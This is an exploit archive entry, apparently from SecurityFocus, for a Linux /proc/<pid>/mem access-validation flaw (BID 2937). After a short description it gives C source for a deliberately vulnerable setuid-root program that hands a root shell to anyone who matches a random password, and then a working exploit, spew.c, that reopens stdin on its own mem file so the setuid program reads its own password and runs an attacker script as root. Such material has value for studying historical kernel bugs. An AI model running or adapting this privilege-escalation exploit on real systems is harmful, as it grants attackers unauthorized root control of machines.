/*
source: http://www.securityfocus.com/bid/2937/info

The Linux /proc filesystem is a virtual filesystem provided by the Linux Kernel as an interface to some process and system information and parameters.

Under certain circumstances, an access validation error may exist in the handling of process-specific 'mem' files. The problem occurs when a process re-opens the standard input stream for reading from it's associated 'mem' file prior to executing another program using the exec() family of functions.

This could have serious ramifications in some situations if an attacker were to reposition the read offset of the file to an arbitrary location prior to executing a setuid program that obtains data from stdin. 
*/

/**********************************************
** vuln-prog.c - chown root:root, chmod u+s **
**********************************************/

char *password, *input;
main(int argc,char*argv[])
{
int fd,count;
if(0>(fd=open("/dev/urandom",0)))exit(1);//check for resource starvation
password=(char*)malloc(17);
read(fd,password,16);
if(close(fd))exit(1);
password[16]=0;
input=(char*)malloc(17);
for(count=0;count<16;count++)input[count]=getchar();
input[count]=0;
for(count=0;count<16;count++)if(input[count]!=password[count])exit(1);
setreuid(0,0);
execl("/bin/bash","sh","-c",argv[1],0);
}

EOF

exploit:-

/* spew.c */
#include <stdio.h>
/* to get the address, ltrace a copy of the program as a normal user,
or brute force it over the expected range. */

#define WHERETOREAD [the address malloced for password by vuln-prog]
// use ltrace on a non setuid copy of the program, or bruteforce it.
main()
{
char y[1000];
FILE *f;
int p;
p=getpid();
sprintf(y,"/proc/%d/mem",p);
close(0);
f=fopen(y,"r");
fseek(f,WHERETOREAD,SEEK_SET);
execl("/tmp/vuln-prog","scary","/tmp/myscript",0);
}